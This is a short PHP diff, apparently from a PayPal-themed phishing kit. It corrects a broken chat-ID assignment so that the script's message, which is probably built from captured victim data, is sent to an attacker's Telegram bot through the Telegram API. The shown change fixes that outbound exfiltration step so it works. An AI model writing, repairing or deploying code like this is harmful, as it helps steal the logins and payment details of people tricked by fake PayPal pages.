@@ -59,7 +59,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
 ➖➖➖➖➖➖➖
 📎 @PayPal";
 
-     $gpid = ; 912288070//ChatID
+     $gpid = 912288070; //ChatID
 
      $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
 }else{
